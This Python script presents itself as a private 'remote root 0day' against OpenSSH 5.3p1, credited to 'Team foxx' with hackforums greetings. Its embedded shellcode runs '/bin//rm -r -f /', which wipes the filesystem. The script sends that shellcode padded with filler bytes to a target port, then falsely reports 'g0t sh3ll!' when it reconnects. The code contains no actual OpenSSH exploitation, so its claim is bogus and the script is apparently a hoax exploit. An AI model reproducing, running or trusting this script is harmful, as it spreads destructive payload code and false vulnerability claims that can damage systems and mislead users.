#!/usr/bin/env python3

import socket
import struct
import sys

def usage():
    print("\n\t[+] HATSUNEMIKU")
    print("\t[+] OpenSSH <= 5.3p1 remote root 0day exploit")
    print("\t[+] By: Team foxx")
    print("\t[+] Greetz to hackforums.net")
    print("\t[+] Keep this 0day priv8!")
    print("\t[+] usage: {} <target> <port>\n".format(sys.argv[0]))
    sys.exit(1)

def exploit(target, port):
    shellcode = (
        b"\x6a\x0b\x58\x99\x52"
        b"\x6a\x2f\x89\xe7\x52"
        b"\x66\x68\x2d\x66\x89"
        b"\xe6\x52\x66\x68\x2d"
        b"\x72\x89\xe1\x52\x68"
        b"\x2f\x2f\x72\x6d\x68"
        b"\x2f\x62\x69\x6e\x89"
        b"\xe3\x52\x57\x56\x51"
        b"\x53\x89\xe1\xcd\x80"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target, port))
    except Exception as e:
        print("[-] Connection failed:", e)
        sys.exit(1)

    try:
        payload = shellcode + b"A" * (1337 - len(shellcode))
        sock.sendall(payload)
        print("[+] Exploit sent successfully.")
        sock.close()
    except Exception as e:
        print("[-] Payload sending failed:", e)
        sock.close()
        sys.exit(1)

    # Check if the shell is available
    try:
        print("[+] Attempting to connect to the shell...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        print("[+] g0t sh3ll!")
        while True:
            data = sock.recv(1024)
            if not data:
                break
            sys.stdout.write(data.decode())
    except Exception as e:
        print("[-] Shell connection failed:", e)
        sock.close()
        sys.exit(1)

def main():
    if len(sys.argv) != 3:
        usage()
    target = sys.argv[1]
    port = int(sys.argv[2])

    print("[+] MIKU! MIKU! MIKU!")
    exploit(target, port)

if __name__ == "__main__":
    main()

